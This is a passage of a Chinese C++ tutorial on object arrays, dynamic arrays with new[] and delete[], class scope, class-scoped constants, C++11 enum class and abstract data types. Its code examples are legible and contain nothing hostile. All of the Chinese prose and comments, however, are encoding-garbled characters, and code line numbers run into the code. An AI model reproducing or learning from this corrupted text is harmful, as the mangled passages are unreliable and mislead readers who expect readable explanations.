å‡½æ•°ï¼Œè€Œ investments[1] åˆ™æ˜¾å¼è°ƒç”¨äº†é»˜è®¤æ„é€ å‡½æ•° Stock()ã€‚ å¦‚æœåˆå§‹åŒ–åˆ—è¡¨æä¾›çš„åˆå§‹å€¼æ•°é‡å°‘äºæ•°ç»„å¤§å°ï¼Œåˆ™å‰©ä½™çš„å…ƒç´ å°†ä½¿ç”¨é»˜è®¤æ„é€ å‡½æ•°è¿›è¡Œåˆå§‹åŒ–ã€‚å¦‚æœç±»æ²¡æœ‰é»˜è®¤æ„é€ å‡½æ•°ï¼Œè¿™å°†å¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚ 12345Stock funds[4] = &#123; Stock(&quot;A Corp&quot;, 10, 1.0), Stock(&quot;B Ltd&quot;, 20, 2.0) // funds[2] å’Œ funds[3] å°†ä½¿ç”¨é»˜è®¤æ„é€ å‡½æ•° Stock() åˆå§‹åŒ–&#125;; è®¿é—®å¯¹è±¡æ•°ç»„æˆå‘˜è®¿é—®æ•°ç»„ä¸­å¯¹è±¡çš„æˆå‘˜ä¸è®¿é—®åŸºæœ¬ç±»å‹æ•°ç»„å…ƒç´ ç±»ä¼¼ï¼Œå…ˆç”¨ç´¢å¼• [] é€‰æ‹©æ•°ç»„ä¸­çš„ç‰¹å®šå¯¹è±¡ï¼Œç„¶åä½¿ç”¨ç‚¹å· . è®¿é—®è¯¥å¯¹è±¡çš„å…¬æœ‰æˆå‘˜ï¼ˆæ•°æ®æˆ–å‡½æ•°ï¼‰ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;#include &quot;stock.h&quot;const int STKS = 4;int main() &#123; // ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨åˆ›å»ºå¹¶åˆå§‹åŒ–æ•°ç»„ Stock stocks[STKS] = &#123; Stock(&quot;NanoSmart&quot;, 12, 20.0), Stock(&quot;Boffo Objects&quot;, 200, 2.0), Stock(&quot;Monolithic Obelisks&quot;, 130, 3.25), Stock(&quot;Fleep Enterprises&quot;, 60, 6.5) &#125;; std::cout &lt;&lt; &quot;Stock holdings:\\n&quot;; int st; for (st = 0; st &lt; STKS; st++) &#123; stocks[st].show(); // è°ƒç”¨æ•°ç»„ä¸­ç¬¬ st ä¸ªå¯¹è±¡çš„ show() æ–¹æ³• &#125; // æ‰¾åˆ°ä»·å€¼æœ€é«˜çš„è‚¡ç¥¨ (ä½¿ç”¨ä¸Šä¸€èŠ‚çš„ topval å‡è®¾å®ƒå·²æ·»åŠ ) // æ³¨æ„ï¼štopval éœ€è¦æ·»åŠ åˆ° Stock ç±»ä¸­æ‰èƒ½ç¼–è¯‘ /* const Stock* top = &amp;stocks[0]; // å‡è®¾ç¬¬ä¸€ä¸ªæ˜¯æœ€é«˜çš„ for (st = 1; st &lt; STKS; st++) &#123; top = &amp;top-&gt;topval(stocks[st]); // æ¯”è¾ƒå¹¶æ›´æ–° top æŒ‡é’ˆ &#125; std::cout &lt;&lt; &quot;\\nMost valuable holding:\\n&quot;; top-&gt;show(); // æ˜¾ç¤ºä»·å€¼æœ€é«˜çš„è‚¡ç¥¨ä¿¡æ¯ */ // ä¿®æ”¹æ•°ç»„ä¸­æŸä¸ªå¯¹è±¡çš„çŠ¶æ€ std::cout &lt;&lt; &quot;\\nBuying more Boffo Objects...\\n&quot;; stocks[1].buy(50, 2.5); // è°ƒç”¨ stocks[1] å¯¹è±¡çš„ buy() æ–¹æ³• stocks[1].show(); return 0;&#125; è¾“å‡ºç¤ºä¾‹ (å‡è®¾ topval éƒ¨åˆ†è¢«æ³¨é‡Šæ‰): 123456789101112131415161718192021Constructor using NanoSmart calledConstructor using Boffo Objects calledConstructor using Monolithic Obelisks calledConstructor using Fleep Enterprises calledStock holdings:Company: NanoSmart Shares: 12 Share Price: $20.000 Total Worth: $240.00Company: Boffo Objects Shares: 200 Share Price: $2.000 Total Worth: $400.00Company: Monolithic Obelisks Shares: 130 Share Price: $3.250 Total Worth: $422.50Company: Fleep Enterprises Shares: 60 Share Price: $6.500 Total Worth: $390.00Buying more Boffo Objects...Company: Boffo Objects Shares: 250 Share Price: $2.500 Total Worth: $625.00Bye, Fleep Enterprises!Bye, Monolithic Obelisks!Bye, Boffo Objects!Bye, NanoSmart! æ³¨æ„ï¼šç¨‹åºç»“æŸæ—¶ï¼Œæ•°ç»„ stocks ä¸­çš„æ¯ä¸ªå¯¹è±¡çš„ææ„å‡½æ•°éƒ½ä¼šè¢«è°ƒç”¨ï¼ˆæŒ‰ä¸æ„é€ ç›¸åçš„é¡ºåºï¼‰ã€‚ åŠ¨æ€å¯¹è±¡æ•°ç»„ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ new æ¥åˆ›å»ºåŠ¨æ€çš„å¯¹è±¡æ•°ç»„ã€‚ 12int size = 5;Stock *portfolio = new Stock[size]; // åˆ›å»ºåŒ…å« 5 ä¸ª Stock å¯¹è±¡çš„åŠ¨æ€æ•°ç»„ é»˜è®¤æ„é€ å‡½æ•°è¦æ±‚: ä½¿ç”¨ new ClassName[size] è¿™ç§å½¢å¼æ—¶ï¼Œå¿…é¡»è¦æ±‚ç±»å…·æœ‰å¯è®¿é—®çš„é»˜è®¤æ„é€ å‡½æ•°ï¼Œå› ä¸ºå®ƒä¼šä¸ºæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•°ã€‚ C++11 åˆ—è¡¨åˆå§‹åŒ– (å¯é€‰): C++11 å…è®¸åœ¨ä½¿ç”¨ new åˆ›å»ºæ•°ç»„æ—¶æä¾›åˆå§‹åŒ–åˆ—è¡¨ï¼Œè¿™æ ·å¯ä»¥è°ƒç”¨ç‰¹å®šçš„æ„é€ å‡½æ•°ï¼Œå¹¶ä¸”å¦‚æœæä¾›äº†æ‰€æœ‰å…ƒç´ çš„åˆå§‹åŒ–å€¼ï¼Œåˆ™ä¸å¼ºåˆ¶è¦æ±‚é»˜è®¤æ„é€ å‡½æ•°ã€‚ 1234567891011// C++11 or laterStock *p_list = new Stock[3] &#123; Stock(&quot;X Inc&quot;, 1, 1.0), Stock(&quot;Y Ltd&quot;, 2, 2.0), Stock(&quot;Z LLC&quot;, 3, 3.0)&#125;;Stock *p_partial = new Stock[4] &#123; Stock(&quot;A&quot;, 1, 1.0), Stock(&quot;B&quot;, 2, 2.0) // p_partial[2] å’Œ p_partial[3] éœ€è¦é»˜è®¤æ„é€ å‡½æ•°&#125;; è®¿é—®: è®¿é—®åŠ¨æ€æ•°ç»„æˆå‘˜å¯ä»¥ä½¿ç”¨æ•°ç»„è¡¨ç¤ºæ³• portfolio[i].member æˆ–æŒ‡é’ˆè¡¨ç¤ºæ³• (portfolio + i)-&gt;memberã€‚ é‡Šæ”¾å†…å­˜: å¿…é¡»ä½¿ç”¨ delete [] æ¥é‡Šæ”¾åŠ¨æ€åˆ†é…çš„å¯¹è±¡æ•°ç»„ï¼Œä»¥ç¡®ä¿æ¯ä¸ªå¯¹è±¡çš„ææ„å‡½æ•°éƒ½è¢«æ­£ç¡®è°ƒç”¨ã€‚ 123delete [] portfolio; // è°ƒç”¨ 5 æ¬¡ææ„å‡½æ•°ï¼Œç„¶åé‡Šæ”¾å†…å­˜delete [] p_list;delete [] p_partial; é”™è¯¯: ä½¿ç”¨ delete portfolio; åªä¼šè°ƒç”¨ç¬¬ä¸€ä¸ªå…ƒç´ çš„ææ„å‡½æ•°ï¼Œå¹¶å¯èƒ½å¯¼è‡´å†…å­˜æ³„æ¼æˆ–æœªå®šä¹‰è¡Œä¸ºã€‚ æ€»ç»“ å¯ä»¥åƒåˆ›å»ºåŸºæœ¬ç±»å‹æ•°ç»„ä¸€æ ·åˆ›å»ºå¯¹è±¡æ•°ç»„ã€‚ åˆ›å»ºå¯¹è±¡æ•°ç»„æ—¶ï¼Œä¼šä¸ºæ¯ä¸ªå…ƒç´ è°ƒç”¨æ„é€ å‡½æ•°ã€‚ å¦‚æœæœªæä¾›æ˜¾å¼åˆå§‹åŒ–ï¼Œåˆ™è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•°ã€‚å› æ­¤ï¼Œå¯¹äºæœªåˆå§‹åŒ–çš„æ•°ç»„æˆ–ä½¿ç”¨ new ClassName[size] åˆ›å»ºçš„åŠ¨æ€æ•°ç»„ï¼Œç±»å¿…é¡»æœ‰å¯è®¿é—®çš„é»˜è®¤æ„é€ å‡½æ•°ã€‚ å¯ä»¥ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨ä¸ºæ•°ç»„æˆå‘˜æŒ‡å®šä¸åŒçš„æ„é€ å‡½æ•°ã€‚ é€šè¿‡ arrayName[index].member çš„æ–¹å¼è®¿é—®æ•°ç»„æˆå‘˜ã€‚ åŠ¨æ€å¯¹è±¡æ•°ç»„ä½¿ç”¨ new ClassName[size] åˆ›å»ºï¼Œå¹¶å¿…é¡»ä½¿ç”¨ delete [] arrayPtr é‡Šæ”¾ã€‚ 10.6 ç±»ä½œç”¨åŸŸæˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œåœ¨å‡½æ•°å†…éƒ¨æˆ–ä»£ç å—å†…éƒ¨å®šä¹‰çš„å˜é‡å…·æœ‰å±€éƒ¨ä½œç”¨åŸŸï¼ˆå—ä½œç”¨åŸŸï¼‰ã€‚ç±»ä¼¼åœ°ï¼Œåœ¨ç±»ä¸­å®šä¹‰çš„åç§°ï¼ˆæ•°æ®æˆå‘˜ã€æˆå‘˜å‡½æ•°ã€åµŒå¥—ç±»å‹ã€æšä¸¾ç­‰ï¼‰ä¹Ÿæœ‰å…¶ç‰¹å®šçš„ä½œç”¨åŸŸï¼Œç§°ä¸º**ç±»ä½œç”¨åŸŸ (Class Scope)**ã€‚ ç±»ä½œç”¨åŸŸçš„è§„åˆ™: å†…éƒ¨å¯è§æ€§: åœ¨ç±»å£°æ˜æˆ–æˆå‘˜å‡½æ•°å®šä¹‰å†…éƒ¨ï¼Œå¯ä»¥ç›´æ¥è®¿é—®ç±»çš„æˆå‘˜ï¼ˆæ•°æ®æˆå‘˜ã€æˆå‘˜å‡½æ•°ã€æšä¸¾ç­‰ï¼‰ï¼Œæ— éœ€ç‰¹æ®Šé™å®šã€‚ å¤–éƒ¨è®¿é—®é™åˆ¶: åœ¨ç±»çš„å¤–éƒ¨ï¼Œä¸èƒ½ç›´æ¥è®¿é—®ç±»çš„æˆå‘˜ã€‚å¿…é¡»é€šè¿‡å¯¹è±¡ï¼ˆä½¿ç”¨ç‚¹å· . æˆ–ç®­å¤´ -&gt;ï¼‰æˆ–è€…é€šè¿‡ç±»åå’Œä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ ::ï¼ˆå¯¹äºé™æ€æˆå‘˜ã€åµŒå¥—ç±»å‹æˆ–æšä¸¾ï¼‰æ¥è®¿é—®ã€‚ åç§°éš”ç¦»: ç±»ä½œç”¨åŸŸæ„å‘³ç€åœ¨ä¸€ä¸ªç±»å†…éƒ¨å®šä¹‰çš„åç§°ä¸ä¼šä¸åœ¨å¦ä¸€ä¸ªç±»æˆ–å…¨å±€ä½œç”¨åŸŸä¸­å®šä¹‰çš„åŒååç§°å†²çªã€‚ä¾‹å¦‚ï¼Œä¸¤ä¸ªä¸åŒçš„ç±»å¯ä»¥éƒ½æœ‰ä¸€ä¸ªåä¸º count çš„æ•°æ®æˆå‘˜ã€‚ ç¤ºä¾‹: 12345678910111213141516171819202122232425262728293031class ClassA &#123;public: int count; // ClassA çš„ count void process() &#123; value = 10; &#125; // å¯ä»¥ç›´æ¥è®¿é—® valueprivate: int value; // ClassA çš„ value&#125;;class ClassB &#123;public: double count; // ClassB çš„ count (ä¸ ClassA::count ä¸å†²çª) void calculate() &#123; /* ... */ &#125;&#125;;int global_count = 100; // å…¨å±€å˜é‡int main() &#123; ClassA objA; ClassB objB; objA.count = 1; // è®¿é—® ClassA å¯¹è±¡çš„ count æˆå‘˜ objB.count = 2.5; // è®¿é—® ClassB å¯¹è±¡çš„ count æˆå‘˜ // é”™è¯¯ï¼ä¸èƒ½ç›´æ¥è®¿é—®ç±»å†…éƒ¨çš„åç§° // count = 5; // è®¿é—®å“ªä¸ª countï¼Ÿ // value = 20; // é”™è¯¯ï¼value åœ¨ç±»ä½œç”¨åŸŸå†… objA.process(); // é€šè¿‡å¯¹è±¡è°ƒç”¨æˆå‘˜å‡½æ•° return 0;&#125; ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ :: å½“æˆ‘ä»¬éœ€è¦åœ¨ç±»å¤–éƒ¨å¼•ç”¨ç±»ä½œç”¨åŸŸå†…çš„åç§°æ—¶ï¼ˆä¾‹å¦‚ï¼Œåœ¨å®šä¹‰æˆå‘˜å‡½æ•°æˆ–è®¿é—®é™æ€æˆå‘˜æ—¶ï¼‰ï¼Œå°±éœ€è¦ä½¿ç”¨ç±»åå’Œä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ ::ã€‚ 12345// åœ¨ç±»å¤–éƒ¨å®šä¹‰æˆå‘˜å‡½æ•°void ClassA::process() &#123; // ä½¿ç”¨ ClassA:: æŒ‡æ˜ process å±äº ClassA value = 10; // åœ¨æˆå‘˜å‡½æ•°å†…éƒ¨ï¼Œå¯ä»¥ç›´æ¥è®¿é—®å…¶ä»–æˆå‘˜ this-&gt;count = 5; // ä¹Ÿå¯ä»¥æ˜¾å¼ä½¿ç”¨ this&#125; 10.6.1 ä½œç”¨åŸŸä¸ºç±»çš„å¸¸é‡æœ‰æ—¶ï¼Œæˆ‘ä»¬å¸Œæœ›åœ¨ç±»ä¸­å®šä¹‰ä¸€ä¸ªå¸¸é‡ï¼Œè¿™ä¸ªå¸¸é‡å¯¹äºè¯¥ç±»çš„æ‰€æœ‰å¯¹è±¡æ¥è¯´éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå¹¶ä¸”å¯èƒ½åœ¨ç¼–è¯‘æ—¶å°±éœ€è¦çŸ¥é“å®ƒçš„å€¼ï¼ˆä¾‹å¦‚ï¼Œç”¨äºæŒ‡å®šæ•°ç»„å¤§å°ï¼‰ã€‚ æœ‰å‡ ç§æ–¹æ³•å¯ä»¥åœ¨ç±»ä½œç”¨åŸŸå†…åˆ›å»ºå¸¸é‡ï¼š static const æˆå‘˜ (æ•´å‹æˆ–æšä¸¾ç±»å‹ - C++11 å‰å¸¸ç”¨): å¯¹äºæ•´å‹ï¼ˆint, char, bool ç­‰ï¼‰æˆ–æšä¸¾ç±»å‹çš„å¸¸é‡ï¼Œå¯ä»¥åœ¨ç±»å®šä¹‰å†…éƒ¨ä½¿ç”¨ static const ç›´æ¥åˆå§‹åŒ–ã€‚static æ„å‘³ç€è¿™ä¸ªå¸¸é‡å±äºç±»æœ¬èº«ï¼Œè€Œä¸æ˜¯ä»»ä½•ç‰¹å®šå¯¹è±¡ï¼ˆæ‰€æœ‰å¯¹è±¡å…±äº«åŒä¸€ä¸ªå¸¸é‡ï¼‰ï¼Œconst æ„å‘³ç€å®ƒçš„å€¼ä¸èƒ½è¢«ä¿®æ”¹ã€‚ 12345678910111213class Bakery &#123;private: // è¿™ä¸ªå¸¸é‡å±äºç±»ï¼Œæ‰€æœ‰å¯¹è±¡å…±äº« static const int Months = 12; // å£°æ˜å¹¶åˆå§‹åŒ–é™æ€å¸¸é‡æˆå‘˜ double costs[Months];public: // ...&#125;;// æ³¨æ„ï¼šå¦‚æœéœ€è¦åœ¨ç±»å¤–éƒ¨è·å–è¯¥å¸¸é‡çš„åœ°å€ï¼Œ// æˆ–è€…ç¼–è¯‘å™¨è¦æ±‚ï¼ˆè¾ƒæ—§çš„ç¼–è¯‘å™¨å¯èƒ½éœ€è¦ï¼‰ï¼Œ// å¯èƒ½è¿˜éœ€è¦åœ¨æºæ–‡ä»¶ä¸­æä¾›ä¸€ä¸ªå®šä¹‰ï¼ˆä¸å¸¦åˆå§‹å€¼ï¼‰ï¼š// const int Bakery::Months; // å¯é€‰çš„å®šä¹‰ è¿™ç§æ–¹å¼ä¸èƒ½ç”¨äºåˆå§‹åŒ–éæ•´å‹æˆ–éæšä¸¾ç±»å‹çš„é™æ€å¸¸é‡ã€‚ static constexpr æˆå‘˜ (C++11 åŠä»¥å): C++11 å¼•å…¥äº† constexprï¼Œå®ƒå…è®¸åœ¨ç¼–è¯‘æ—¶è®¡ç®—å¸¸é‡è¡¨è¾¾å¼ã€‚ä½¿ç”¨ static constexpr å¯ä»¥å®šä¹‰å„ç§ç±»å‹çš„ç±»ä½œç”¨åŸŸå¸¸é‡ï¼Œåªè¦åˆå§‹åŒ–è¡¨è¾¾å¼æ˜¯å¸¸é‡è¡¨è¾¾å¼å³å¯ã€‚è¿™æ˜¯ç°ä»£ C++ ä¸­å®šä¹‰ç±»å¸¸é‡çš„æ¨èæ–¹å¼ã€‚ 1234567891011121314class Config &#123;public: static constexpr int MaxUsers = 100; static constexpr double Rate = 1.5; static constexpr const char* DefaultMsg = &quot;Welcome&quot;; // ...&#125;;int main() &#123; int userLimit = Config::MaxUsers; // ç›´æ¥ä½¿ç”¨ç±»åè®¿é—® double currentRate = Config::Rate; // ... return 0;&#125; static constexpr æˆå‘˜é»˜è®¤æ˜¯å†…è”çš„ï¼Œé€šå¸¸ä¸éœ€è¦åœ¨ç±»å¤–éƒ¨å†æ¬¡å®šä¹‰ã€‚ æšä¸¾æŠ€å·§ (Enum Hack - C++11 å‰çš„å˜é€šæ–¹æ³•): åœ¨ C++11 ä¹‹å‰ï¼Œå¦‚æœæƒ³åœ¨ç±»ä¸­å®šä¹‰ä¸€ä¸ªéæ•´å‹çš„å¸¸é‡ï¼ˆæˆ–è€…åªæ˜¯æƒ³é¿å… static const å¯èƒ½éœ€è¦çš„å¤–éƒ¨å®šä¹‰ï¼‰ï¼Œæœ‰æ—¶ä¼šä½¿ç”¨åŒ¿åæšä¸¾ã€‚ 1234567class LegacyBox &#123;private: enum &#123; MaxSize = 100 &#125;; // æšä¸¾æŠ€å·§ int items[MaxSize]; // ä½¿ç”¨æšä¸¾é‡ä½œä¸ºæ•°ç»„å¤§å°public: // ...&#125;; MaxSize å°±åƒä¸€ä¸ªå€¼ä¸º 100 çš„æ•´å‹å¸¸é‡ï¼Œä½†å®ƒæ˜¯ä¸€ä¸ªæšä¸¾é‡ã€‚è¿™ç§æ–¹æ³•ç°åœ¨å·²ä¸å¸¸ç”¨ï¼Œstatic constexpr æ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚ 10.6.2 ä½œç”¨åŸŸå†…æšä¸¾ (Scoped Enumerations - C++11)ä¼ ç»Ÿçš„ C++ æšä¸¾ï¼ˆenumï¼‰å­˜åœ¨ä¸€äº›é—®é¢˜ï¼š åç§°å†²çª: æšä¸¾é‡ï¼ˆenumeratorsï¼‰è¢«æ”¾ç½®åœ¨ä¸æšä¸¾å®šä¹‰ç›¸åŒçš„ä½œç”¨åŸŸä¸­ï¼Œå®¹æ˜“ä¸å…¶ä»–åç§°ï¼ˆåŒ…æ‹¬å…¶ä»–æšä¸¾çš„æšä¸¾é‡ï¼‰å‘ç”Ÿå†²çªã€‚ éšå¼è½¬æ¢: æšä¸¾é‡å¯ä»¥éšå¼åœ°è½¬æ¢ä¸ºæ•´å‹ï¼Œæœ‰æ—¶è¿™å¯èƒ½å¯¼è‡´é€»è¾‘é”™è¯¯æˆ–é™ä½ç±»å‹å®‰å…¨æ€§ã€‚ 1234567enum OldColor &#123; RED, GREEN, BLUE &#125;;enum StopLight &#123; RED, YELLOW, GREEN &#125;; // é”™è¯¯ï¼RED å’Œ GREEN é‡å®šä¹‰OldColor myColor = RED; // OKint colorValue = myColor; // OK, éšå¼è½¬æ¢ä¸º int (å€¼ä¸º 0)if (myColor == 0) &#123; /* ... */ &#125; // å¯ä»¥å’Œæ•´æ•°æ¯”è¾ƒ ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼ŒC++11 å¼•å…¥äº†**ä½œç”¨åŸŸå†…æšä¸¾ (Scoped Enumerations)**ï¼Œä½¿ç”¨ enum class æˆ– enum struct å…³é”®å­—å®šä¹‰ã€‚ ç‰¹ç‚¹: ä½œç”¨åŸŸé™åˆ¶: æšä¸¾é‡çš„ä½œç”¨åŸŸè¢«é™åˆ¶åœ¨æšä¸¾æœ¬èº«å†…éƒ¨ã€‚è®¿é—®æšä¸¾é‡å¿…é¡»ä½¿ç”¨æšä¸¾åç§°å’Œä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ ::ã€‚ æ— éšå¼è½¬æ¢: ä½œç”¨åŸŸå†…æšä¸¾ç±»å‹ä¸èƒ½éšå¼åœ°è½¬æ¢ä¸ºæ•´å‹æˆ–å…¶ä»–ç±»å‹ã€‚å¦‚æœéœ€è¦è½¬æ¢ï¼Œå¿…é¡»ä½¿ç”¨æ˜¾å¼ç±»å‹è½¬æ¢ï¼ˆå¦‚ static_castï¼‰ã€‚ ç±»å‹å®‰å…¨: å¢å¼ºäº†ç±»å‹å®‰å…¨æ€§ï¼Œä¸åŒä½œç”¨åŸŸæšä¸¾ç±»å‹çš„å€¼ä¸èƒ½ç›´æ¥æ¯”è¾ƒï¼ˆé™¤éé‡è½½äº†æ¯”è¾ƒè¿ç®—ç¬¦ï¼‰ã€‚ å¯æŒ‡å®šåº•å±‚ç±»å‹: å¯ä»¥æ˜¾å¼æŒ‡å®šæšä¸¾ä½¿ç”¨çš„åº•å±‚æ•´æ•°ç±»å‹ï¼ˆé»˜è®¤ä¸º intï¼‰ã€‚ è¯­æ³•: 1234enum class EnumName : UnderlyingType &#123; Enumerator1, Enumerator2, ... &#125;;// æˆ–è€… enum struct (åŠŸèƒ½ç›¸åŒ)enum struct EnumName : UnderlyingType &#123; Enumerator1, Enumerator2, ... &#125;;// : UnderlyingType æ˜¯å¯é€‰çš„ ç¤ºä¾‹: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;// ä½¿ç”¨ enum class å®šä¹‰ä½œç”¨åŸŸå†…æšä¸¾enum class Color : unsigned char &#123; // æŒ‡å®šåº•å±‚ç±»å‹ä¸º unsigned char RED, // Color::RED GREEN, // Color::GREEN BLUE // Color::BLUE&#125;;enum class TrafficLight &#123; RED, // TrafficLight::RED (ä¸ Color::RED ä¸å†²çª) YELLOW, GREEN&#125;;int main() &#123; Color myColor = Color::RED; // å¿…é¡»ä½¿ç”¨ä½œç”¨åŸŸè§£æç¬¦ TrafficLight light = TrafficLight::GREEN; // é”™è¯¯ï¼æšä¸¾é‡ä¸åœ¨å½“å‰ä½œç”¨åŸŸ // Color anotherColor = RED; // é”™è¯¯ï¼ä¸èƒ½éšå¼è½¬æ¢ä¸º int // int colorCode = myColor; // éœ€è¦æ˜¾å¼è½¬æ¢ int colorCode = static_cast&lt;int&gt;(myColor); unsigned char underlyingValue = static_cast&lt;unsigned char&gt;(myColor); std::cout &lt;&lt; &quot;Color code: &quot; &lt;&lt; colorCode &lt;&lt; std::endl; // è¾“å‡º 0 std::cout &lt;&lt; &quot;Underlying value: &quot; &lt;&lt; static_cast&lt;int&gt;(underlyingValue) &lt;&lt; std::endl; // è¾“å‡º 0 (éœ€è¦å†æ¬¡è½¬æ¢æ‰èƒ½æ‰“å°ä¸ºæ•°å­—) // é”™è¯¯ï¼ä¸åŒæšä¸¾ç±»å‹ä¸èƒ½ç›´æ¥æ¯”è¾ƒ // if (myColor == light) &#123; /* ... */ &#125; // å¯ä»¥ä¸ç›¸åŒç±»å‹çš„æšä¸¾é‡æ¯”è¾ƒ if (myColor == Color::RED) &#123; std::cout &lt;&lt; &quot;The color is red.&quot; &lt;&lt; std::endl; &#125; if (light == TrafficLight::GREEN) &#123; std::cout &lt;&lt; &quot;The light is green.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; ä½œç”¨åŸŸå†…æšä¸¾æ˜¯ç°ä»£ C++ ä¸­å®šä¹‰æšä¸¾ç±»å‹çš„é¦–é€‰æ–¹å¼ï¼Œå› ä¸ºå®ƒæ›´å®‰å…¨ã€æ›´ä¸å®¹æ˜“å‡ºé”™ï¼Œå¹¶ä¸”é¿å…äº†åç§°æ±¡æŸ“ã€‚ æ€»ç»“ ç±»æˆå‘˜ï¼ˆæ•°æ®ã€å‡½æ•°ã€ç±»å‹ã€å¸¸é‡ã€æšä¸¾ï¼‰å…·æœ‰ç±»ä½œç”¨åŸŸã€‚ åœ¨ç±»å¤–éƒ¨è®¿é—®ç±»æˆå‘˜éœ€è¦é€šè¿‡å¯¹è±¡ï¼ˆ. æˆ– -&gt;ï¼‰æˆ–ç±»åï¼ˆ::ï¼‰ã€‚ ç±»ä½œç”¨åŸŸå¯ä»¥éš”ç¦»åç§°ï¼Œé˜²æ­¢ä¸å…¨å±€æˆ–å…¶ä»–ç±»ä¸­çš„åç§°å†²çªã€‚ å¯ä»¥ä½¿ç”¨ static const (æ•´å‹/æšä¸¾) æˆ– static constexpr (C++11, æ¨è) åœ¨ç±»å†…éƒ¨å®šä¹‰å¸¸é‡ã€‚ C++11 å¼•å…¥äº†**ä½œç”¨åŸŸå†…æšä¸¾ (enum class æˆ– enum struct)**ï¼Œå…¶æšä¸¾é‡ä½œç”¨åŸŸé™åˆ¶åœ¨æšä¸¾å†…ï¼Œä¸”ä¸èƒ½éšå¼è½¬æ¢ä¸ºæ•´å‹ï¼Œæé«˜äº†ä»£ç çš„å®‰å…¨æ€§å’Œæ¸…æ™°åº¦ã€‚ 10.7 æŠ½è±¡æ•°æ®ç±»å‹æˆ‘ä»¬åœ¨æœ¬ç« ä¸­å­¦ä¹ çš„ç±»æ˜¯ C++ å®ç°æŠ½è±¡æ•°æ®ç±»å‹ (Abstract Data Type, ADT) çš„ä¸€ç§æ–¹å¼ã€‚ADT æ˜¯ä¸€ç§è®¡ç®—æœºç§‘å­¦çš„æ¦‚å¿µï¼Œå®ƒæ˜¯ä¸€ç§æ•°å­¦æ¨¡å‹ï¼Œç”¨äºæè¿°å…·æœ‰ç‰¹å®šè¡Œä¸ºï¼ˆè¯­ä¹‰ï¼‰çš„æ•°æ®ç±»å‹ï¼Œé‡ç‚¹åœ¨äºå¯ä»¥å¯¹æ•°æ®æ‰§è¡Œçš„æ“ä½œï¼Œè€Œä¸æ˜¯è¿™äº›æ“ä½œçš„å…·ä½“å®ç°æ–¹å¼æˆ–æ•°æ®çš„å†…éƒ¨è¡¨ç¤ºã€‚ ADT çš„æ ¸å¿ƒæ€æƒ³: æ•°æ®å°è£…: ADT å°†æ•°æ®ä»¥åŠå¯¹è¿™äº›æ•°æ®è¿›è¡Œæ“ä½œçš„å‡½æ•°æ†ç»‘åœ¨ä¸€èµ·ã€‚ æ¥å£ä¸å®ç°åˆ†ç¦»: ADT å®šä¹‰äº†ä¸€ä¸ªå…¬å…±æ¥å£ (Interface)**ï¼Œå³ä¸€ç»„å¯ä»¥å¯¹æ•°æ®æ‰§è¡Œçš„æ“ä½œã€‚ç”¨æˆ·é€šè¿‡è¿™ä¸ªæ¥å£ä¸æ•°æ®äº¤äº’ï¼Œè€Œä¸éœ€è¦çŸ¥é“æ•°æ®æ˜¯å¦‚ä½•å­˜å‚¨çš„ï¼Œæˆ–è€…æ“ä½œæ˜¯å¦‚ä½•å®ç°çš„ï¼ˆå®ç°ç»†èŠ‚éšè—**ï¼‰ã€‚ å¯ä»¥æŠŠ ADT æƒ³è±¡æˆä¸€ä¸ªâ€œé»‘ç›’å­â€ã€‚ä½ çŸ¥é“ä½ å¯ä»¥ç»™è¿™ä¸ªç›’å­æä¾›ä»€ä¹ˆè¾“å…¥ï¼ˆé€šè¿‡æ¥å£è°ƒç”¨æ“ä½œï¼‰ï¼Œä»¥åŠä½ ä¼šå¾—åˆ°ä»€ä¹ˆè¾“å‡ºæˆ–ç»“æœï¼Œä½†ä½ ä¸éœ€è¦ï¼ˆä¹Ÿä¸èƒ½ï¼‰çœ‹åˆ°ç›’å­å†…éƒ¨çš„æ„é€ ã€‚ ä¸å†…ç½®ç±»å‹çš„ç±»æ¯”: æƒ³æƒ³ C++ çš„å†…ç½®ç±»å‹ intã€‚ æ•°æ®: å®ƒå¯ä»¥è¡¨ç¤ºæ•´æ•°ã€‚ æ“ä½œ: ä½ å¯ä»¥å¯¹ int æ‰§è¡ŒåŠ ã€å‡ã€ä¹˜ã€é™¤ã€æ¯”è¾ƒç­‰æ“ä½œã€‚ æŠ½è±¡: ä½ ä½¿ç”¨è¿™äº›æ“ä½œæ—¶ï¼Œå¹¶ä¸éœ€è¦å…³å¿ƒ int åœ¨å†…å­˜ä¸­æ˜¯å¦‚ä½•ç”¨äºŒè¿›åˆ¶ä½è¡¨ç¤ºçš„ï¼Œæˆ–è€…åŠ æ³•æ“ä½œåœ¨ CPU å±‚é¢æ˜¯å¦‚ä½•æ‰§è¡Œçš„ã€‚ä½ åªå…³å¿ƒæ“ä½œçš„æ•ˆæœã€‚ ADT å°†è¿™ç§æ€æƒ³æ‰©å±•åˆ°äº†ç”¨æˆ·è‡ªå®šä¹‰çš„æ•°æ®ç±»å‹ã€‚ C++ ç±»å¦‚ä½•å®ç° ADT: C++ ç±»å¤©ç„¶åœ°æ”¯æŒ ADT çš„æ¦‚å¿µï¼š æ•°æ®è¡¨ç¤º: ç±»çš„æ•°æ®æˆå‘˜ï¼ˆé€šå¸¸æ˜¯ privateï¼‰ç”¨äºå­˜å‚¨ ADT çš„æ•°æ®ã€‚ æ“ä½œæ¥å£: ç±»çš„å…¬æœ‰æˆå‘˜å‡½æ•°ï¼ˆpublic methodsï¼‰å®šä¹‰äº† ADT çš„å…¬å…±æ¥å£ï¼Œå³å…è®¸å¤–éƒ¨ä»£ç æ‰§è¡Œçš„æ“ä½œã€‚ å®ç°éšè—: 